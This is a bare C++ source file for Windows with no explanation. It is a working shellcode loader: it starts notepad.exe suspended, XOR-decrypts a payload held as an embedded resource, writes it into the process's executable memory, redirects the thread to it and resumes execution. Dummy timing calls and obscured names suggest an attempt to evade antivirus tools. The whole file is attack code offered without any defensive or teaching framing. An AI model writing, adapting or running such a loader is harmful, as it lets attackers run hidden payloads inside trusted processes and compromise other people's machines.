
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void generate_time() {
    std::srand(static_cast<unsigned int>(std::time(0)));  
}

void loadResource_with(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

int main() {
    
    const char* processPath = "C:\\Windows\\System32\\notepad.exe";
    char* key101k;
    DWORD key101kLen;
    loadResource_with("dhanushkey1", &key101k, &key101kLen);
    char* code199k;
    DWORD code199kLen;
    loadResource_with("dhanushcode56", &code199k, &code199kLen);
     const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcess(processptaah, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    GetTickCount();
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetTickCount();
    GetThreadContext(pi.hThread, &ctx);

    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    for (DWORD da = 0; da < code199kLen; da++) {
        code199k[da] ^= key101k[da % key101kLen];
    }
    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)memlo; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 

    return 0;
}
